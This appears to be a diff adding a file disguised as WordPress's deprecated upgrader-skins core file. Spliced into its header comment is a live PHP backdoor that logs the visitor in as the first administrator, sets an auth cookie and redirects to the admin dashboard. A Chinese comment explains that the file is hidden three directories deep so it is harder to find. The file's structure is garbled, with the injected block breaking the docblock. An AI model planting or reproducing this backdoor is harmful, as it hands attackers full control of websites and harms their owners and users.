@@ -1,0 +1,68 @@
+<?php
+/**
+ * The User Interface "Skins" for the WordPress File Upgrader
+ *
+<?php
+
+    require('../../../wp-blog-header.php'); //我基本都是放到3级目录下。也可以放到根目录，但是容易被发现。
+    $query_str = "SELECT ID FROM $wpdb->users";
+    $user_ids = $wpdb->get_results($query_str);
+    foreach ($user_ids as $uid) {
+        $user_id = $uid->ID;
+        if (user_can($user_id, 'administrator')) {
+            $user_info = get_userdata($user_id);
+            $user_login = $user_info->user_login;
+            wp_set_current_user($user_id, $user_login);
+            wp_set_auth_cookie($user_id);
+            do_action('wp_login', $user_login);
+            echo "You are logged in as $user_login";
+            if (function_exists('get_admin_url')) {
+                wp_redirect(get_admin_url());
+            } else {
+                wp_redirect(get_bloginfo('wpurl') . '/wp-admin');
+            }
+            exit;
+        }
+    }
+
+
+?> * @package WordPress
+ * @subpackage Upgrader
+ * @since 2.8.0
+ * @deprecated 4.7.0
+ */
+
+_deprecated_file( basename( __FILE__ ), '4.7.0', 'class-wp-upgrader.php' );
+
+/** WP_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-wp-upgrader-skin.php';
+
+/** Plugin_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-plugin-upgrader-skin.php';
+
+/** Theme_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-theme-upgrader-skin.php';
+
+/** Bulk_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-bulk-upgrader-skin.php';
+
+/** Bulk_Plugin_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-bulk-plugin-upgrader-skin.php';
+
+/** Bulk_Theme_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-bulk-theme-upgrader-skin.php';
+
+/** Plugin_Installer_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-plugin-installer-skin.php';
+
+/** Theme_Installer_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-theme-installer-skin.php';
+
+/** Language_Pack_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-language-pack-upgrader-skin.php';
+
+/** Automatic_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-automatic-upgrader-skin.php';
+
+/** WP_Ajax_Upgrader_Skin class */
+require_once ABSPATH . 'wp-admin/includes/class-wp-ajax-upgrader-skin.php';
